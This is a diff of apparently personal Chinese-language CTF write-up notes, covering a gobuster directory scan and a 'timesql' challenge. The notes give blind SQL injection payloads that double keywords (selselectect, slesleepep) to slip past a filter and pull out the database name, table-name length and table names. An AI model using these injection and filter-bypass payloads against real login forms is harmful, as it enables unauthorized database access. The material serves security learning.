@@ -1014,16 +1014,18 @@ gobuster进行目录扫描：
 ![[Pasted image 20240311122534.png]]
 扫到一个/bin目录，访问，拿到所需的BrainPan.exe：
 ![[Pasted image 20240311122616.png]]
-[嘤嘤嘤]timesql #SQL注入漏洞 时间盲注
+[嘤嘤嘤]timesql #SQL注入漏洞 时间/盲注
+题名写了timesql但是测试直接异或盲注他回显不一致，就用
 爆数据库名
 ```
 username=admin'%20anandd%20subsubstrstr(database()%2c§1§%2c1)%3d'§2§'%20%23&password=114514
 ```
 ![[Pasted image 20240327161324.png]]
-爆表名长度
+爆表名长度 为5
 ```
-username=114514' oorr iiff(length(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='hazel')=§1§,slesleepep(5),3)--+&password=114514
+username=admin'%20anandd%20length((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase()))%20%3d%20§1§%20%23
 ```
+![[Pasted image 20240328190530.png]]
 爆表名 为 users
 ```
 username=114514' oorr iiff(subsubstrstr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='hazel'),§1§,1)='§z§',slesleepep(5),3)--+&password=114514
